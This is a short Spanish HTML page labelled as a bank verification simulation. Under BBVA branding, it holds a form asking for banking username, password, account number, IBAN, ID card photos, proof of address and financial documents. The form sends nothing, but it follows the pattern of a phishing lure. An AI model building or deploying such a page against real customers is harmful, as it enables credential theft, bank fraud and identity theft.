<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <title>Verificación Bancaria</title>
  <style>
    body { font-family: Arial, sans-serif; background: #fff; margin: 20px; }
    .accordion { border: 1px solid #000; margin-bottom: 10px; }
    .accordion-header { padding: 10px; cursor: pointer; font-weight: bold; }
    .accordion-content { display: none; padding: 10px; border-top: 1px solid #000; }
    label { display: block; margin-top: 8px; }
  </style>
</head>
<body>

  <h2>Simulación de Verificación Bancaria</h2>

  <!-- Banco único -->
  <div class="accordion">
    <div class="accordion-header">Banco BBVA</div>
    <div class="accordion-content">
      <form>
        <label>Usuario:
          <input type="text" name="usuario">
        </label>
        <label>Contraseña:
          <input type="password" name="contraseña">
        </label>
        <label>Número de cuenta principal:
          <input type="text" name="cuenta_principal">
        </label>
        <label>IBAN:
          <input type="text" name="iban">
        </label>
        <label>Foto carnet identidad (frontal):
          <input type="file" name="id_frontal">
        </label>
        <label>Foto carnet identidad (trasera):
          <input type="file" name="id_trasera">
        </label>
        <label>Comprobante de domicilio:
          <input type="file" name="domicilio">
        </label>
        <label>Justificantes financieros (nómina, impuestos, ingresos):
          <input type="file" name="financieros">
        </label>
      </form>
    </div>
  </div>

  <script>
    const header = document.querySelector(".accordion-header");
    header.addEventListener("click", () => {
      const content = header.nextElementSibling;
      content.style.display = content.style.display === "block" ? "none" : "block";
    });
  </script>

</body>
</html>
